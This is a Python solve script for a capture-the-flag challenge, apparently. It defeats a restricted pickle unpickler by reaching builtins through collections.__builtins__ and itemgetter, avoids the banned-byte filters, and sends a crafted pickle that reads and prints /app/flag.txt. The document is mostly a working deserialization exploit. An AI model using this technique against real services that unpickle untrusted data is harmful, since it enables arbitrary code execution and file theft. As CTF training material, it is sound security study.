#!/usr/bin/env python3
"""pickle / "timecapsule" -- read the flag through a restricted unpickler.

Three filters guard /restore:
  1. BANNED_PATTERNS forbids the raw byte b"." anywhere in the pickle. The pickle STOP
     opcode *is* b"." (0x2e), so a valid, terminated pickle is impossible.
  2. BANNED_INSTRUCTION = "REDUCE" is searched for in pickletools.dis() output -- but
     check() wraps dis() in `except Exception: disassembled = "Error!"`. A pickle with no
     STOP makes dis() raise, so the REDUCE check is never reached. Constraint (1) forces
     exactly the condition that disables (2).
  3. RestrictedUnpickler.find_class allows only the modules `sessionstore` and
     `collections`.

Unpickling errors are swallowed (`except Exception: pass`) while stdout is captured and
returned, so opcodes executed before the EOF still take effect and anything printed is
exfiltrated.

Escape: `collections.__builtins__` is the builtins *dict*, and `collections._itemgetter`
is `operator.itemgetter` -- both reachable under the module allowlist. itemgetter(name)
applied to that dict yields any builtin whose name dodges the substring ban, so we take
print/open/tuple/bytes. The path "/app/flag.txt" cannot appear literally (it contains
both "." and "flag"), so it is assembled as bytes([...]) from integer opcodes; open()
accepts a bytes path. tuple(fileobj) splits it into lines and REDUCE calls
print(*lines).

Usage: solve.py <base-url>
"""
import base64
import re
import sys

import requests

PATH = b"/app/flag.txt"


def build() -> bytes:
    p = bytearray()

    def glob(mod: str, name: str) -> None:
        p.extend(b"c" + mod.encode() + b"\n" + name.encode() + b"\n")

    def put(i: int) -> None:
        p.extend(b"p%d\n" % i)

    def get(i: int) -> None:
        p.extend(b"g%d\n" % i)

    def call1(arg_ops) -> None:
        """REDUCE: callable already on the stack, wrap one arg into a 1-tuple."""
        p.extend(b"(")
        arg_ops()
        p.extend(b"tR")

    glob("collections", "__builtins__")   # the builtins dict
    put(0)
    glob("collections", "_itemgetter")    # operator.itemgetter
    put(1)

    for slot, name in ((2, "print"), (3, "open"), (4, "tuple"), (5, "bytes")):
        get(1)
        call1(lambda name=name: p.extend(b"V" + name.encode() + b"\n"))  # itemgetter(name)
        call1(lambda: get(0))                                            # ...(builtins) -> builtin
        put(slot)

    # path bytes, assembled from integers so "." and "flag" never appear literally
    get(5)

    def int_list() -> None:
        p.extend(b"](")
        for b in PATH:
            p.extend(b"I%d\n" % b)
        p.extend(b"e")

    call1(int_list)                       # bytes([...])
    put(6)

    get(3); call1(lambda: get(6)); put(7)   # f = open(path)
    get(4); call1(lambda: get(7)); put(8)   # lines = tuple(f)
    get(2); get(8); p.extend(b"R")          # print(*lines)
    return bytes(p)


def main() -> int:
    base = sys.argv[1].rstrip("/")
    data = build()
    assert b"." not in data, "payload contains a banned dot"
    r = requests.post(f"{base}/restore", json={"payload": base64.b64encode(data).decode()},
                      timeout=30)
    j = r.json()
    print("ok:", j.get("ok"), "| disassembled:", repr(j.get("disassembled"))[:40])
    out = j.get("output") or ""
    print("output:", out)
    m = re.search(r"pwnsec\{[^}]*\}", out)
    if m:
        print("FLAG:", m.group(0))
        return 0
    print("error:", j.get("error"), file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
